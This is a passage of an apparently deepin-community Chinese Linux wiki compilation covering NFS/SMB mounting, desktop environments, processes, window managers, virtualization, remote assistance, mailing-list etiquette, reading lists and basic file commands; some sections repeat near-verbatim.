是一个成功的文件共享方法，但它最大的问题是它不太适合于大型的分散式系统。2000年推出的第四版NFS，受到OpenAFS与SMB的影响很大。挂载共享挂载 NFS 共享与挂载本地文件系统稍有不同。不是指定一个本地设备，而是需要告诉 mount NFS 服务器的域名或 IP 地址，以及要挂载的目录，中间用一个冒号隔开。mount -t nfs darkstar.example.com:/home /home

SMB Samba，是种用来让UNIX系列的操作系统与微软Windows操作系统的SMB/CIFS（Server Message Block/Common Internet File System）网络协定做连结的自由软件。目前的版本（v3）不仅可存取及分享SMB的资料夹及打印机，本身还可以整合入Windows Server的网域，扮演为网域控制站（Domain Controller）以及加入Active Directory成员。简而言之，此软件在Windows与UNIX系列OS之间搭起一座桥梁，让两者的资源可互通有无。连接到 SMB 共享（samba shares）十分直接。遗憾的是，SMB 的支持度没有 NFS 那么好，但它还是提供了与 Windows 主机的良好性能和连接性。因此，SMB 是部署在局域网的文件共享协议。挂载与共享值得庆幸的是挂载 SMB 共享很简单，与 NFS 共享十分相似。你可以用同样的方式告诉 mount 在哪里找到服务器和及想要读取哪个共享。另外，你必须指定一个用户名和密码。# mount -t cifs  darkstar/home /home -o username=alan,password=secret你可能想知道为什么该文件系统是 cifs 而非 smbfs。在 Linux 内核的较老版本中，用的是 smbfs，后来被性能更好、更安全的 cifs 驱动所取代。所有的 SMB 共享都需要用户名和密码作为参数。这在你想要将 smb 共享放到 fstab 时会导致安全问题。可以使用 credentials 参数来避免这一问题。credentials 会指向含有用户名和密码信息的文件。只要该文件能够得到安全地保护并只能由 root 读取，那么你的认证资格受到影响的可能性就会减小。

标题：桌面环境
在图形计算中，一个桌面环境(Desktop Environment)为计算机提供一个图形用户界面（GUI）。

对应于早期的文字命令行界面（CLI），一个典型的桌面环境提供图标，视窗，工具栏，文件夹，壁纸等软件界面，并且内置了各式各样的多媒体软件、系统程序、游戏、实用程序、网页开发工具、编程 工具等等。整体而言，桌面环境在设计和功能上的特性，赋予了它与众不同的外观和感觉。

开源的Linux系统拥有很多桌面环境可以更换.但流行的闭源操作系统Microsoft Windows和Mac OS X所用的桌面环境是相对不可变的。但是也有主题和第三方软件可以完全更改常见界面元素的外观（比如窗口、按钮和图标）以及界面本身。在Windows中，这一切可以通过替换默认的Explorer shell来实现。

深度桌面环境 DDE：深度科技团队基于Qt和GO开发的全新桌面环境。
Gnome Shell：世界最为流行、基于GTK图形库开发的桌面环境。
KDE：世界最为流行、基于QT图形库开发的桌面环境。
Unity：ubuntu团队基于Gnome Shell开发的桌面环境。
Xfce：轻巧优美的Xfce桌面环境。
LXDE：极度简洁的LXDE桌面环境。
Gnome2：已经失去支持的Gnome2桌面环境。
MATE:Linux Mint发行版基于Gnome2的开发的桌面环境。
Cinnamon:Linux Mint发行版基于Gnome Shell的开发的桌面环境。
Razor-qt：基于QT开发的桌面环境.

桌面环境是由很多软件包构成的，不同的桌面环境需要的软件包相差很大，就算两个不同的桌面环境需要的软件包相同，但是需要的版本也不一样，由于Linux存在软件依赖这一特殊情况，所以并不是所有桌面环境都可以共存。

标题：程序与进程
源代码是指按照一定编写语言标志编写的代码，源代码经过编译或者解释后运行的则为程序。编程语言分类为：- 编译型语言：需要通过编译器将源代码编译为计算机能理解机器语言后，计算机才能执行高级编程语言（编译一次永久运行）。代表语言为C/C++，效率较高。- 解释型语言：不需要通过编译器编译，但是需要通过语言的解释器解释后，计算机才能执行高级编程语言（每运行一次就需要解释一次）。代表语言为Python，效率较低。- 脚本型语言：是为了缩短传统的编写-编译-链接-运行过程而创建的计算机编程语言。代表语言为JavaScript。效率较低。

进程和程序的区别:程序是指一段完成功能的代码，或者说是一个工具，它是一个静态的概念，而进程它是动态的，比如，linux的vi编辑器，它就是一段在linux下用于文本编辑的工具，那么它是一个程序，而我们在linux终端中，可以分别开启两个vi编辑器的进程。进程简单的说就是一个程序一次执行的过程，它是一个动态的概念。按照教科书上的定义，进程是程序执行的实例，是linux的基本调度单位。

一个进程由如下元素组成：- 进程的当前上下文，即进程的当前执行状态；- 进程的当前执行目录- 进程访问的文件和目录- 进程的访问权限，比如它的文件模式和所有权- 内存和其他分配给进程的系统资源

在linux系统中，内核使用进程来控制对CPU和其他系统资源的访问，并且使用进程来决定在CPU上运行哪个程序，运行多久以及采用什么特性运行它。内核的调度器负责在所有的进程间分配CPU执行时间，称为时间片(time slice)，它轮流在每个进程分得的时间片用完后从进程那里抢回控制权。

OS会为每个进程分配一个唯一的整型ID，做为进程的标识号(pid)。进程除了自身的ID外，还有父进程ID(ppid),所有进程的祖先进程是同一个进程，它叫做init进程，ID为1，init进程是内核自检后的一个启动的进程。init进程负责引导系统、启动守护（后台）进程并且运行必要的程序。

Linux 操作系统包括四种不同类型的进程它们是：交互进程、批处理进程、守护进程和僵尸进程（特殊进程）。每种进程都有自己的特点和属性。- 交互进程：是由一个Shell启动的进程。既可以在前台运行，也可以在后台运行。- 批处理进程:和终端没有联系，是一个进程序列。- 系统守护:进程是Linux系统启动时启动的进程，并在后台运行。- 僵尸进程（特殊进程）：是指已终止运行，但尚未被清除的进程。

说明：守护进程总是活跃的，一般是后台运行，守护进程一般是由系统在开机时通过脚本自动激活启动或超级管理用户root来启动。比如在 Fedora中，我们可以定义httpd 服务器的启动脚本的运行级别，此文件位于/etc/init.d目录下，文件名是httpd，/etc/init.d/httpd 就是httpd服务器的守护程序，当把它的运行级别设置为3和5时，当系统启动时，它会跟着启动。由于守护进程是一直运行着的，所以它所处的状态是等待请求处理任务。

进程的属性包括：进程ID（PID)：是唯一的数值，用来区分进程。父进程和父进程的ID（PPID)。启动进程的用户ID（UID）和所归属的组（GID）。进程状态：状态分为运行R、休眠S、僵尸Z。进程执行的优先级。进程所连接的终端名。进程资源占用：比如占用资源大小（内存、CPU占用量）。

父进程和子进程的关系是管理和被管理的关系，当父进程终止时，子进程也随之而终止。但子进程终止，父进程并不一定终止。

进程和程序的区别:程序是指一段完成功能的代码，或者说是一个工具，它是一个静态的概念，而进程它是动态的。进程是程序执行的实例，是linux的基本调度单位。一个进程由如下元素组成：进程的当前上下文；进程的当前执行目录；进程访问的文件和目录；进程的访问权限；内存和其他分配给进程的系统资源。内核的调度器负责在所有的进程间分配CPU执行时间，称为时间片。OS会为每个进程分配一个唯一的整型ID做为进程的标识号(pid)。进程还有父进程ID(ppid),所有进程的祖先进程是init进程，ID为1。

标题：窗口管理器
窗口管理器（Window manager）是一个系统软件，是在图形用户界面的视窗系统中，控制窗口位置与外观的软件 通常与窗口管理器的功能为:打开，关闭，最小化，最大化，移动，调整大小，跟踪正在运行的窗口，包括窗口装饰。许多窗口管理器还配备了各种实用程序和功能：如dock，任务栏，程序发射器，桌面图标和壁纸。

窗口管理器按照如何绘制和更新窗口通常分为三种类别。

合成窗口管理器，让所有窗口被创建并单独绘制，然后放在一起，显示在各种2D和3D环境。是最先进的合成窗口管理器.Compiz:基于OpenGL的混合型窗口管理器。KWin:基于OpenGL的混合型窗口管理器。

不重叠画面的方式组织屏幕画面，相对于传统的方式，它更近似于以坐标为基础的叠置物件（窗口），其尝试模仿办公桌的式样。I3：一款平铺式的窗口管理器。Xmonad：一款平铺式的窗口管理器。

不同的窗口可以相互层叠或者平铺的窗口管理器.E17：开发耗时最长的窗口管理器,但是功能强大接近桌面环境。Openbox：一个可高度定制的下一代窗口管理器。Fvwm：一款以最小的内存换取最多的特性的窗口管理器。Fluxbox：一款轻量级的窗口管理器。

标题：Deepin系统内核
内核是每个操作系统中最重要的部分，内核直接影响着操作系统的稳定性以及操作易用性，整个操作系统的内存分配，磁盘读写都是操作系统内核控制的。deepin基于自由开源的Linux内核，稳定版一般会使用Linux kernel中稳定性较好的版本，测试版会使用Linux kernel最新的版本，但是最新版本的内核漏洞很多，缺乏稳定性。随着内核版本的更新，系统的使用体验也会不断提升。同时，你也可以自行编译deepin的内核，不过可能因内核版本问题出现问题，需要一定技术基础。deepin的内核每个版本会有所不同，大多数情况会在安装时会直接使用镜像机的内核，部分版本会让用户根据需要自行选择内核版本。

标题：虚拟化
虚拟化能够将单个计算机的硬件元素（包括处理器、内存、存储器等）拆分成多个虚拟硬件,以组成虚拟机(Virtual Machine) 每个虚拟机都运行不同的操作系统或程序 ，在数据中心,企业服务器较为常用

AMD-V技术（AMD虚拟化技术）是对x86处理器系统架构的一组硬件扩展和硬件辅助虚拟化技术，可以简化纯软件的虚拟化解决方案，改进VMM（虚拟机监视器）的设计，更充分地利用硬件资源，提高服务器和数据中心的虚拟化效率。目前AMD提供的所有处理器均具备AMD-V虚拟化功能，不论是笔记本电脑还是刀片服务器，均可为其提供强大的虚拟化性能、安全性及可靠性。虚拟化 (AMD-V™) 技术是一系列芯片集成功能，可帮助您更好地利用和提高虚拟化资源的性能

Intel VT可以让一个CPU工作起来像多个CPU在并行运行，从而使得在一部电脑内同时运行多个操作系统成为可能。这种VT技术并不是一个新鲜事物，市面上已经有一些软件可以达到虚拟多系统的目的，比如VMware workstation、Virtual PC等，使用这种技术就可以单CPU模拟多CPU并行，可以实现单机同时运行多操作系统。

ARM Hyperviosr

LoongArch KVM虚拟化是基于龙芯 LoongArch 处理器的虚拟化解决方案. 龙芯平台 KVM 虚拟化技术已随操作系统发布正式版本，可满足演示验证及相关云厂商进行适配、二次开发工作

AMD-V技术是对x86处理器系统架构的一组硬件扩展和硬件辅助虚拟化技术，可以简化纯软件的虚拟化解决方案，改进VMM（虚拟机监视器）的设计。目前AMD提供的所有处理器均具备AMD-V虚拟化功能

Intel VT可以让一个CPU工作起来像多个CPU在并行运行，从而使得在一部电脑内同时运行多个操作系统成为可能。市面上已经有一些软件可以达到虚拟多系统的目的，比如VMware workstation、Virtual PC等

LoongArch KVM虚拟化是基于龙芯 LoongArch 处理器的虚拟化解决方案.龙芯平台 KVM 虚拟化技术已随操作系统发布正式版本

标题：远程协助
远程协助主要是帮助用户、技术人员解决各种问题，同时遇到问题可以发起寻求别人的帮助，通过远程协助可以轻松的实现远程工作、培训、交互式教学等。

当您遇到问题需要在线寻求帮助时，可以发起远程协助求助功能，共享桌面给对方来进行远程协助操作。1. 点击桌面底部的![launcher-24](/images/1/18/Launcher_icon.png) 或将鼠标指针移到屏幕左上角，进入启动器界面。2. 通过浏览找到 ![remoteassistance-24](/images/3/3f/Remoteassistance-24.png) 进行点击运行。3. 在远程协助界面，点击 **我要求助**。

4. 系统会自动随机生成六位数的验证码。5. 点击 **复制**，将验证码提供给对方进行远程求助。![notes](/images/5/51/Notes.png)：界面将提示“正在连接，请耐心等待...”，如果连接成功后，求助界面将自动隐藏到任务栏上。

当其他人请求远程协助时，您可以向对方获取已产生的验证码，输入验证码并进入对方的桌面。1. 获取对方的验证码。2. 进入启动器界面，点击 **远程协助**。3. 在远程协助界面，点击 **帮助别人**，手动输入或直接粘贴验证码。4. 点击 **连接**，系统自动连接并进入对方的桌面。> ![attention](/images/c/c7/Attention.png)：如果您长时间未使用该验证码或使用该验证码不能正常连接，请重新获取新的验证码。

当您输入验证码成功后，系统会自动进入对方的远程桌面中，您可以对桌面进行控制操作，还可以设置远程桌面显示的效果。当您连接远程桌面成功后，点击 **选项** 下拉菜单，您可以：- 设置 **画质优先**，保证远程协助桌面的画面达到最佳显示。- 设置 **性能优先**，使远程协助的性能达到最优状态。- 设置 **平衡**，使远程桌面达到平衡的状态。- 设置 **全屏**，调整到全屏模式以便您更加方便的进行远程操作。

当您完成远协助相关操作后，可以通过远程协助桌面中的按钮来结束并断开连接。1. 在对方的桌面上系统会显示断开按钮。2. 点击 **断开连接**，系统提示您确定需要关闭远协助桌面连接。3. 点击 **确定**，您可以结束本次远程协助操作。> ![notes](/images/5/51/Notes.png)：您还可以点击“我在求助”界面上 **断开** 按钮来结束操作。

您可以点击关于查看远程协助的版本介绍。1. 在远程协助界面，点击 ![icon_menu](/images/4/44/Icon_menu.png)。2. 点击 **关于**。3. 查看关于远程协助的版本和介绍。

您可以点击帮助获取远程协助的帮助手册，通过帮助进一步让您了解和使用远程协助。1. 在远程协助界面，点击 ![icon_menu](/images/4/44/Icon_menu.png)。2. 点击 **帮助**。3. 查看关于远程协助的帮助手册。

您可以进入菜单栏点击退出远程协助。1. 在远程协助界面，点击 ![icon_menu](/images/4/44/Icon_menu.png)。2. 点击 **退出**。> ![notes](/images/5/51/Notes.png)：您也可以在远程协助界面中点击 × 按钮来退出。

标题：邮件列表的文化与礼节
邮件列表是邮件的一种特殊应用，传统的邮件是一对一的信件传递，而邮件列表实现了邮件交流的群组功能。其原理是：将一封邮件发送到搭建在邮件列表服务上的服务帐户，该帐户收到邮件后，会将其转发给所有订阅该邮件列表服务的邮件帐户，从而实现一封邮件发送至特定组别与多人分享信息的功能。

一般来说，只有订阅了指定的邮件列表，才能在该列表中发送邮件，与其他组员进行内部交流。其他组员收到邮件后，可针对此邮件回复，参与到一个线索（thread）的讨论中，这些回复同样会被其他订阅者看到。每一个邮件列表都有明确的主题，例如上海Linux用户组的邮件列表主要交流Linux相关话题，还有Python、Java等编程语言的交流列表。有些列表人气旺、流量大（high volume），订阅前需谨慎。

邮件列表的优势之一是纯粹的交流氛围。相比QQ群常出现的灌水、闲聊（如聊完技术聊天气、政治等偏题内容），邮件列表是严肃的交流场所，很少出现与主题无关的闲聊与灌水。

邮件列表的另一优势是归档功能。所有发送到邮件列表中的邮件和thread的交流历史与记录，会被永久保存于邮件列表服务器及专门的归档网站。用户可通过Google等搜索引擎，轻松搜索到已被问过的问题，并从归档中获取解答，无需重复提问等待。

邮件列表还是国际统一的交流方式。全世界协作性开源软件项目开发时都会使用邮件列表，官方邮件列表常见于各类计算机技术官方网站，用于相关技术交流及项目协作发展，无需向外国人询问QQ群等其他方式。

邮件列表属于UNIX与Internet文化的一部分，使用者崇尚简单与效率，即UNIX中的K.I.S.S（Keep It Simple Stupid）文化。技术交流无需过多文学描述和表情符号，只需清晰描述问题，因为时间对每个人都很宝贵。

邮件列表中很少有人交流与主题无关的话题。例如在Linux相关列表中，即使在thread主题前加[OT]（Off-Topic，标识偏题）发起Windows相关问题，仍可能被认为来错地方，甚至受到冷嘲热讽。

邮件列表中即使有激烈争执，也很少有人进行人身攻击（尤其是爆粗口）。老手看到此类语言会觉得奇怪，管理员则会ban（永久性kick，不得缓刑）发出攻击语言的人。这里是争执最少且最理智的地方，双方会用道理说服对方。

邮件列表的礼仪包括：不要回复与理睬Spammer。Spammer会发送垃圾邮件，管理员无法删除已发送的thread，此时应不予回复，可设置filter屏蔽该thread。对Spammer冷嘲热讽可能导致自己被其他订阅者过滤。

邮件列表礼仪要求不使用不文雅、不恰当的语言交流。应将其视为正规场合（如五星级宾馆大会议室），与业内高手交流。在此说错话丢脸甚至被踢出，会被铭记在互联网历史中。

邮件列表礼仪提倡少灌水。若需发起偏题（一般不太远）的thread，需在主题前加[OT]标识（Off-Topic），告知他人这是偏题内容，方便他人决定是否参与讨论。

邮件列表礼仪包括尊重管理员的决定。邮件列表多用于技术与学术交流，管理员工作吃力不讨好，无利益驱动，管理大流量列表需多心思。订阅者应配合管理，有不同想法可发布thread交流。

加入邮件列表的方法因服务端软件而异。Google Groups是常见的邮件列表服务提供商，可查看其官方链接了解详情。另一种常见服务是mailman，打开指定列表页面后，输入邮箱地址和姓名注册，通过邮件确认审核即可加入。

计算机技术的革新速度极其惊人，在网络通讯交流技术上更是如此，从最古老的UNIX上的talk命令(各类IM软件的前身)发展到今天的各种IM(Instant Messenger，例如QQ、MSN等)以及VoIP(Voice over Internet Protocol，例如Skype)软件。在功能、技术和效率上翻了何止10倍。然而，计算机技术、学术的交流圈却忠于传统的一些通讯交流技术，人们还在使用比IM诞生的更早的电子邮件技术进行信息的交流与传递。这看似是一种很奇怪的现象，走在计算机技术最前沿的群体却使用着普通用户早就弃用的传统的“古老”的计算机技术在进行通讯，其中自然是有它的道理。邮件列表(Mailing list)就是其中的道理，本文会告诉你什么是邮件列表，为什么我们都推荐使用邮件列表，它的文化与礼仪又是什么。

邮件列表是邮件的一种特殊应用，我们知道传统的邮件是一对一的进行信件的传递。邮件列表则实现了邮件交流的群组功能。它的原理是将一封邮件发送到邮件列表服务帐户(它搭建在一个邮件列表服务上)，邮件列表服务帐户收到这封邮件后，会将它转发给所有订阅该邮件列表服务的邮件帐户(subscriber)，从而达到一封邮件发送至特定组别与多人分享信息的功能。一般来说，只有订阅了指定的邮件列表，才能在该邮件列表中发送邮件，与其他组员进行列表内部的交流。在其他组员收到邮件列表里的邮件之后，他们可以进行针对此邮件进行回复，参与到一个线索(thread)的讨论中来，理所当然的，参与交流回复的邮件，同样能够被其他订阅者看到，大家就可以畅所欲言，一起交流。

这是一个很好的问题，对于新手来说，最具吸引力的回答应该就是，使用邮件列表会让你看起来像个高手。哈哈，那当然是开玩笑的说法了，邮件列表的杀手级优势主要有三: * 纯粹的交流氛围–说到群组讨论，大部分国人第一个会想到的还是QQ群，QQ的用户基数非常大，几乎所有中国人，会上网的都会有QQ帐户。使用QQ群交流对于大家来说是很方便，但是它有一个最严重的问题，那就是灌水与闲聊，任何一个管理不是太严格的QQ群，都会出现聊完技术聊天气，聊完天气聊政治等各方面严重偏题与闲聊的情况。邮件列表则是一个很严肃的交流场所，很少会出现与列表主题无关的闲聊与灌水。* 归档功能 –所有发送到邮件列表中的邮件和thread的交流历史与记录，都会被永久保存记录在邮件列表服务器以及一些专门搜集邮件列表归档的网站上。这样做是为了用户在寻找可能已知的问题答案时，不需要自己再去列表提问与等待解答，通过Google等搜索引擎，可以很轻松地搜索出自己可能不知道但是已经被问了无数遍的问题，然后从曾经的邮件列表归档中得到解答。* 国际统一的交流方式 –全世界在进行一些协作性开源软件项目的开发时，都会使用到邮件列表，你一定不会去向一个外国人询问你们项目有没有QQ群。但你可以从各类计算机技术的官方网站上看到其官方邮件列表的身影，它们就是用于与其技术有关的交流，为了项目更好的协作与发展。现在你应该了解到，邮件列表是多么的适合技术与学术的交流，这也是为什么那么多先进的通讯技术发展起来，邮件列表至今没有被淘汰的原因。因为它对技术工程师和从业者来说，是无可替代的。

使用邮件列表的人往往崇尚简单与效率，也就是UNIX中的K.I.S.S(Keep It Simple Stupid)文化。技术的交流不需要过多的文学性质描述和表情符号或表情图片，只需要你将问题描述清楚，大家一同来参与交流即可，时间对于每个人来说都是宝贵的。此外，很少会有人在邮件列表交流与列表主题无关的话题，例如在与Linux相关的邮件列表中，你如果发起一个与Windows相关的问题，即使你在 thread主题前加上了[OT]的字样(Off-Topic，向邮件列表发送偏题的主题，需要加上[OT]来进行标识和说明)，人家还是会觉得你来错了地方，运气不好，就会受到冷嘲热讽。网络上的交流，同样免不了火星撞地球的情况，但是邮件列表是一个很奇特的地方，即使出现激烈的争执，也不会有多少人会在邮件列表里会对他人进行人身攻击，尤其是爆粗口。通常邮件列表的使用老手在看到这样的语言出现后第一个反应会是笑笑或者感到奇怪(奇怪为什么会有人在邮件列表上谩骂)，而邮件列表管理员的反应更简单了，ban(永久性kick，不得缓刑)了你。邮件列表是我所见过的出现争执最少并且最理智的地方，即使出现争执，双方也会尽可能地用道理来说服对方，从中也能擦出智慧的火花。邮件列表是藏龙卧虎的地方，你需要小心翼翼地去进行问题的交流与探讨，相信我，没有素质的人根本无法参与到邮件列表的交流中去，更不用说去融入到这样的黑客文化中。

在之前的文化探讨中，多多少少说到了一些礼仪问题，网络礼仪(Netiquette)更能反应一个人的素质与修养。在邮件列表中的常规礼仪有这些:* 不要回复与理睬Spammer-邮件列表有一个弊端，就是管理员无法删除已经发送到邮件列表的thread。Spammer通过各种方式进入邮件列表后，会向邮件列表发送垃圾邮件。这个时候你需要做的就是不予回复与理睬，有的朋友会设置filter，将这个thread进行屏蔽。如果你对Spammer进行冷嘲热讽，Spammer不但不会理睬，还可能导致你自己被其他订阅者一同过滤掉。在稍后的列表应用技巧中，会提到这个问题。* 不要使用不文雅、不恰当的语言进行交流–你需要将邮件列表视为正规场合，将它想象成五星级宾馆内的大会议室，你在同其他一些业内的高手一同交流问题。在这样的场合下，你一定不会夸夸其谈，甚至辱骂其他与会者。在邮件列表内说错话丢脸甚至被列表踢出，是会一辈子被铭记在互联网历史的事情，当然，也有人不尊重自己的网络ID，今天换一个明天换一个，然后美其名曰真正的黑客就是这么做的，不过这类人群一般使用邮件列表较少，也无法参与和融入到真正的黑客文化中。* 少灌水–这个问题在邮件列表内其实比较少被提到，但是可能很多新手并不知道这个问题。因为如果你能加入一个优秀的邮件列表，你立即会喜欢上这种严肃正经的交流氛围，自然而然的就会把灌水、偏题之类的想法抛到脑后。如果你需要发起一个偏题(一般也不会偏的太远)的thread，你需要在Thread的邮件主题前加上[OT]的标识，意思是Off-Topic，告诉别人这是偏题的，你可以节约你宝贵的时间，不参与到我这个thread的讨论中。* 尊重管理员的决定–邮件列表很少与商业性质有关，一般都是用来交流技术与学术。在网络群组中，管理员其实是吃力不讨好的工作，没有利益驱动，为了管理好一个大流量的邮件列表需要花不少心思。所以，日常的管理工作需要订阅者一起配合才能更好的完成。有不同的想法就可以向列表中发布thread提出自己的看法大家一起交流，这样的方法会非常奏效。这些都是较为传统的礼仪与规范，需要每一位邮件列表的订阅者去自觉尊守。

邮件列表是一种服务，有着不同的服务端软件。所以加入邮件列表的方法视具体情况而定。我们可能经常听说的Google Groups就是一个邮件列表服务提供商，点击[<https://support.google.com/groups/answer/1067205?hl=en&rd=1> 这里]了解加入Google Groups的详情。另一种常见的邮件列表服务为mailman，当你打开一个使用mailman的指定邮件列表页面，你只需要输入你的邮箱地址以及你的姓名，即可注册加入到邮件列表，并通过邮件确认的方式来通过审核。

相关链接: * [<https://groups.google.com/forum/#!msg/mstcinxdu/M0EMXHIH1nk/hj6c8eLrERkJ> 转载来源]

标题：资源&学习
深度科技社区宣言, 深度科技社区理念, 提问的智慧, 邮件列表的文化与礼节

用户贡献指南, 社区开发团队, 文档&国际化团队, 内部测试团队, 社区管理团队, 深度书籍团队, 深度商店应用收录规范

深度操作系统项目, Linux内核与GNU/Linux发行版, Linux标准规范, Linux桌面演进

GNU General Public License Version 3(GPLv3), GNU General Public License Version 2(GPLv2), GNU Lesser General Public License Version 3(LGPLv3), Berkeley Software Distribution license(BSD), The MIT License (MIT), Mozilla Public License(MPL), Eclipse Public License(EPL), Apache License

OSchina, Linux中国, IMCN, 薄荷开源网, OMG Ubuntu, Phoronix, Web Upd8, Jupiter Broadcasting, DistroWatch.com

Linux.org, The Linux Foundation, The GNU Operating System, Linux.com, The Linux Kernel Archives, GNOME, KDE, GIMP, LibreOffice, Mozilla, pkgs

Steam, Humble Store, FireFlower Games, GamersGate, Games Republic, GOG.com, IndieGameStand, itch.io, PlayDeb, Portable Games for Linux, Penguspy, Indie DB, Linux游戏站

GitHub, Sourceforge, Freecode, Bitbucket, Git@OSC, Coding

deepin, Linux Mint, Debian, Ubuntu, Mageia, Fedora, openSuse, Arch Linux, Gentoo, Slackware, Red Hat Enterprise Linux, elementary OS

Debian Wiki, Arch Wiki, Gentoo Wiki, LFS, The Linux Documentation Project, IBM developerWorks, Linux Wireless

《鸟哥的Linux私房菜 基础篇（第三版）》, 《鸟哥的Linux私房菜 服务器篇（第三版）》, Linux From Scratch 6.6, Linux中文man在线手册, Linux常用命令速查, 开源世界旅行手册, 大量Linux书籍

Python 教程, Python入门在线学习, w3school 在线教程, w3cschool菜鸟教程, 实验楼

《Linux其实很简单》作者为刘金鹏, 《完美应用Ubuntu（第二版）》作者为何晓龙、李明, 《Ubuntu Linux从初学到精通》作者为潘光洋, 《鸟哥的Linux私房菜 基础学习篇（第三版）》作者为蔡德明, 《LINUX权威指南》作者为Matt Welsh、Matthias Dalheimer、Kaufman, 《Linux Kernel in a nutshell》作者为Greg Kroah-Hartman, 《Linux系统管理技术手册》作者为Evi Nemeth 、Trent R.Hein 、Garth Snyder. 注意：以上书籍，必须选读一本，以备下一阶段的分类入门做好扎实的基础.

《LINUX设备驱动程序》作者为JonahanCorbet, 《Linux驱动详细解》, 《嵌入式 Linux 应用开发完全手册》作者为韦东山

《LINUX内核源代码情景分析》作者为毛德操, 《深入理解linux内核》作者为DanielP、Bovet, 《Linux内核精髓》 作者为高桥 浩和（Hirokazu Takahashi）, 《Linux内核API完全参考手册》 作者：邱铁、周玉、邓莹莹

《LINUX与UNIX Shell编程指南》

《unix环境高级编程（第二版）》作者为W.Richard Stevens、Stephen A.Rago, 《linux程序设计》作者为Neil Matthew 、Richard Stones

《TCP/IP详解，卷1：协议》是一本完整而详细的TCP/IP协议指南。描述了属于每一层的各个协议以及它们如何在不同操作系统中运行。《TCP/IP详解 卷2：实现》完整而详细地介绍了TCP/IP协议是如何实现的。《TCP-IP详解卷三TCP事务协议，HTTP，NNTP和UNIX域协议》是“TCP/IP详解系列”的延续。

《The C Programming Language》作者为Brian W.Kernighan、Dennis M.Ritchie, 《C和指针》作者为KennethA．Reek, 《C缺陷和陷阱》作者为Andrew Koenig, 《Linux C编程从初学到精通》作者为张繁

《算法导论》作者为Thomas H.Cormen、Charles E.Leiserson、Ronald L.Rivest、Clifford Stein

《Ubuntu Server 最佳方案》 作者为冷罡华（Hiweed）, 《构建高可用Linux服务器（第2版）》 作者：余洪春

《The art of Community》作者为Jono Bacon, 一本关于如何构建开源社区的书籍。Jono Bacon 于 2006 年加入 Canonical，管理着世界范围内的 Ubuntu 开发者、贡献者及用户社区，有着丰富的开源社区运维经验。

标题：Linux文件和目录操作命令
pwd命令是“print working directory”的首字母缩写，功能是显示当前工作目录的绝对路径。其语法为pwd [option]，注意命令与选项间至少有一个空格，通常执行pwd命令不需要带任何参数。PWD是系统环境变量，可用“$”符号输出其值，示例代码：[root@iZ8vb11v8r15ng6q0eb8dzZ ~]# echo $PWD，输出为/root。

cd命令是“change directory”的首字母缩写，功能是从当前工作目录切换到指定目录。语法为cd [option] [dir]，命令、选项、目录间至少有一个空格；选项和目录可省略，单独执行cd命令默认切换到当前登录用户的家目录（由HOME环境变量定义）。cd是bash shell内置命令，查看帮助需用help cd，执行不带参数的cd命令与“cd~”结果一致。

tree命令功能是以树形结构列出指定目录下的所有内容（含文件、子目录及子目录内内容）。语法为tree [option] [directory]，命令、选项、目录间至少有一个空格；不接选项和目录时，默认显示当前路径的目录结构。查询tree是否安装用“rpm -qa tree”，安装用“yum -y install tree”，调整字符集防乱码用“LANG=en_US.UTF-8”。

mkdir命令是“make directories”的字母组合，功能是创建目录；默认若目录已存在，会提示文件已存在且不重复创建。语法为mkdir [option] [directory]，命令、选项、目录间至少有一个空格，可同时创建多个目录（格式：mkdir dir1 dir2…）。利用大括号{}可批量创建目录，示例：mkdir A{B,C}会创建AB和AC两个目录。

touch命令有两个功能：一是创建新的空文件，二是改变已有文件的时间戳属性。语法为touch [option] [file]，需区分与mkdir的差异：mkdir创建空目录，touch创建空文件；Linux中touch不能创建目录，但可修改目录时间戳。GNU/Linux文件有3种时间戳：Access（最后访问时间）、Modify（最后修改时间）、Change（最后改变文件状态时间），对应ls查看选项分别为ls -lu、ls -lt、ls -lc。

ls命令是list的缩写，功能是列出目录内容及内容属性信息（list directory contents）。语法为ls [option] [file]，命令、选项、文件间至少有一个空格；选项和目录文件可省略，默认查看当前路径文件信息。ls -lhi输出中，各列含义依次为：inode索引节点编号、文件类型及权限、硬链接个数、所属用户、所属组、大小、修改时间、实际文件名或目录名。

rm命令是remove的缩写，功能是删除一个或多个文件或目录（remove files or directories），是Linux系统中最危险的命令之一，需慎重使用。语法为rm [option] [file]，删除前建议用mv替代rm移至/tmp回收站、备份（最好异机备份）；若用rm，推荐用“rm文件名”，禁止用“rm -rf文件名”（误删目录无提示），最多用“rm -f文件名”。

ln命令是link的缩写，功能是创建文件间的链接（make links between files），链接类型包括硬链接（hard link）和软链接（符号链接，symbolic link）。语法为ln [option] [source] [target]，创建硬链接用“ln源文件目标文件”，生成普通文件（-字符）；创建软链接用“ln -s源文件目标文件”（目标文件不能事先存在），生成符号链接文件（l类型）。硬链接与源文件inode相同，删除任意一个不删除文件实体；软链接类似Windows快捷方式，删除源文件后软链接失效。

chown命令用于改变文件或目录的用户和用户组。语法为chown [option] [OWNER][:[GROUP]] [file]，常用格式有三种：chown 用户 文件或目录（仅授权用户）、chown :组 文件或目录（仅授权组）、chown 用户:组 文件或目录（授权用户和组），其中“:”可用“.”代替；授权的用户和组必须是系统实际存在的。示例：chown testuser file.txt可将file.txt的所属用户改为testuser。

umask通过八进制数值定义用户创建文件或目录的默认权限。创建文件默认最大权限为666（-rw-rw-rw-），无执行权限；文件权限计算为666减umask，若结果有奇数位则加1（最终为全偶数）。示例：umask 022时，文件权限为666-022=644；umask 045时，666-045=621，因最后一位是奇数，加1后为622。创建目录默认最大权限为777（-rwxrwx-rwx），目录权限计算为777减umask（无奇偶之分）。

cp命令是“copy”的缩写，功能是复制文件或目录。语法为cp [option] [source] [dest]。选项-r用于递归复制目录。

mv命令是“move”的缩写，功能是移动或重命名文件。语法为mv [option] [source] [dest]。选项-i用于覆盖前提示用户。

rmdir命令用于删除空目录，语法为rmdir [option] [directory]。当目录不为空时，命令不起作用。选项-p用于删除多级空目录。

readlink命令用于查看符号链接文件的真实内容。语法为readlink [option] [file]。选项-f用于显示绝对路径。

find命令用于查找目录下的文件，并可调用其他操作。语法为find [pathname] [expression]。选项-name用于按文件名搜索。

xargs命令将标准输入转换成命令行参数。语法为xargs [option]。选项-I用于指定替换字符串。常用于管道操作。

rename命令通过字符串替换批量修改文件名。语法为rename from to file。例如，rename .jpg .png *.jpg将.jpg文件重命名为.png。

basename命令用于显示去除路径和后缀的文件名。语法为basename [name] [suffix]。后缀参数可选，用于去除指定后缀。

dirname命令用于显示文件或目录的路径。语法为dirname [name]。输出为去除文件名的路径部分。

chattr命令改变文件的扩展属性。语法为chattr [option] [mode] [files]。选项+a设置文件只能追加内容。

